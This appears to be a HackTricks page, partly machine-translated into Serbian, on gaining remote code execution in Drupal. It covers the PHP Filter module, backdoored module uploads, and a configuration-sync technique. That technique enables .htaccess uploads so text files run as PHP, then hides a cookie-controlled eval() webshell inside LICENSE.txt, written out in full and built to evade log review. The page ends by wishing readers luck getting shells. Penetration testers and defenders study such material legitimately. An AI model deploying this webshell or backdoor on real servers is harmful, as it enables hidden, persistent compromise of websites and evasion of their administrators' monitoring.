# Drupal RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Sa PHP Filter Modulom

{% hint style="warning" %}
U starijim verzijama Drupala **(pre verzije 8)**, bilo je moguÄ‡e prijaviti se kao administrator i **omoguÄ‡iti `PHP filter` modul**, koji "OmoguÄ‡ava evaluaciju ugraÄ‘enog PHP koda/fragmenta." Ali od verzije 8 ovaj modul nije instaliran po defaultu.
{% endhint %}

1. Idite na **/modules/php** i ako se vrati greÅ¡ka 403, onda je **PHP filter plugin instaliran i moÅ¾ete nastaviti**
1. Ako nije, idite na `Modules` i oznaÄite kutiju `PHP Filter`, a zatim kliknite na `Save configuration`
2. Zatim, da biste to iskoristili, kliknite na `Add content`, zatim odaberite `Basic Page` ili `Article` i napiÅ¡ite **PHP backdoor**, zatim odaberite `PHP` kod u tekstualnom formatu i konaÄno odaberite `Preview`
3. Da biste to aktivirali, jednostavno pristupite novokreiranom Ävoru:
```bash
curl http://drupal.local/node/3
```
## Instalirajte PHP Filter Modul

{% hint style="warning" %}
U trenutnim verzijama viÅ¡e nije moguÄ‡e instalirati dodatke samo uz pristup vebu nakon podrazumevane instalacije.
{% endhint %}

Od verzije **8 pa nadalje,** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **modul nije instaliran podrazumevano**. Da bismo iskoristili ovu funkcionalnost, morali bismo **sami instalirati modul**.

1. Preuzmite najnoviju verziju modula sa Drupal veb sajta.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Kada se preuzme, idite na **`Administracija`** > **`IzveÅ¡taji`** > **`Dostupna aÅ¾uriranja`**.
3. Kliknite na **`PretraÅ¾i`**, izaberite datoteku iz direktorijuma u koji smo je preuzeli, a zatim kliknite na **`Instaliraj`**.
4. Kada je modul instaliran, moÅ¾emo kliknuti na **`SadrÅ¾aj`** i **napraviti novu osnovnu stranicu**, sliÄno kao Å¡to smo uradili u primeru Drupal 7. Ponovo, obavezno **izaberite `PHP kod` iz `Format teksta` padajuÄ‡e liste**.

## Modul sa Bekdorom

{% hint style="warning" %}
U trenutnim verzijama viÅ¡e nije moguÄ‡e instalirati dodatke samo uz pristup vebu nakon podrazumevane instalacije.
{% endhint %}

Bilo je moguÄ‡e **preuzeti** **modul**, dodati mu **bekdor** i **instalirati** ga. Na primer, preuzimanje [**Trurnstile**](https://www.drupal.org/project/turnstile) modula u komprimovanom formatu, kreiranje novog PHP bekdor fajla unutar njega, omoguÄ‡avajuÄ‡i pristup PHP fajlu sa **`.htaccess`** fajlom:
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
And then going to **`http://drupal.local/admin/modules/install`** to install the backdoored module and access **`/modules/turnstile/back.php`** to execute it.

## Backdooring Drupal with Configuration synchronization <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post shared by** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Part 1 (aktivacija _Media_ i _Media Library_)

In the _Extend_ menu (/admin/modules), you can activate what appear to be plugins already installed. By default, plugins _Media_ and _Media Library_ donâ€™t appear to be activated, so letâ€™s activate them.

Before activation:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After activation:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Part 2 (iskoriÅ¡Ä‡avanje funkcije _Configuration synchronization_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Weâ€™ll leverage the _Configuration synchronization_ feature to dump (export) and upload (import) Drupal configuration entries:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Patch system.file.yml**

Letâ€™s start by patching the first entry `allow_insecure_uploads` from:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Da:

Fajl: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Patch field.field.media.document.field\_media\_document.yml**

Zatim, zakrpite drugi unos `file_extensions` iz: 

File: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Da:

File: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Ne koristim to u ovom blog postu, ali je zabeleÅ¾eno da je moguÄ‡e definisati unos `file_directory` na proizvoljan naÄin i da je podloÅ¾an napadu preÄicom (tako da moÅ¾emo da se vratimo unazad unutar Drupal datoteÄnog sistema).

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Deo 3 (iskoriÅ¡Ä‡avanje funkcije _Dodaj dokument_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Zadnji korak je najjednostavniji i deli se na dva pod-koraka. Prvi je da se otpremi datoteka u .htaccess formatu kako bi se iskoristile Apache direktive i omoguÄ‡ilo da .txt datoteke budu interpretirane od strane PHP engine-a. Drugi je da se otpremi .txt datoteka koja sadrÅ¾i naÅ¡ payload.

Datoteka: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
ZaÅ¡to je ovaj trik cool?

Zato Å¡to kada se Webshell (koji Ä‡emo nazvati LICENSE.txt) postavi na Web server, moÅ¾emo prenositi naÅ¡e komande putem `$_COOKIE` i u logovima Web servera, ovo Ä‡e se prikazati kao legitimni GET zahtev za tekstualnom datotekom.

ZaÅ¡to nazvati naÅ¡ Webshell LICENSE.txt?

Jednostavno zato Å¡to ako uzmemo sledeÄ‡u datoteku, na primer [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (koja je veÄ‡ prisutna u Drupal jezgru), imamo datoteku od 339 linija i 17.6 KB veliÄine, Å¡to je savrÅ¡eno za dodavanje malog isjeÄka PHP koda u sredinu (poÅ¡to je datoteka dovoljno velika).

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Datoteka: Patchovana LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Deo 3.1 (upload file .htaccess)**

Prvo, koristimo funkciju _Add Document_ (/media/add/document) da otpremimo naÅ¡ fajl koji sadrÅ¾i Apache direktive (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Deo 3.2 (upload file LICENSE.txt)**

Zatim, ponovo koristimo funkciju _Add Document_ (/media/add/document) da otpremimo Webshell skriven unutar fajla sa licencom.

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Deo 4 (interakcija sa Webshell-om) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Poslednji deo se sastoji od interakcije sa Webshell-om.

Kao Å¡to je prikazano na sledeÄ‡em ekranu, ako kolaÄiÄ‡ koji oÄekuje naÅ¡ Webshell nije definisan, dobijamo sledeÄ‡i rezultat prilikom konsultovanja fajla putem Web pretraÅ¾ivaÄa.

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Kada napadaÄ postavi kolaÄiÄ‡, moÅ¾e da interaguje sa Webshell-om i izvrÅ¡i bilo koje komande koje Å¾eli.

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

I kao Å¡to moÅ¾ete videti u logovima, izgleda da je samo txt fajl zatraÅ¾en.

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Hvala Å¡to ste odvojili vreme da proÄitate ovaj Älanak, nadam se da Ä‡e vam pomoÄ‡i da dobijete neke shell-ove.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
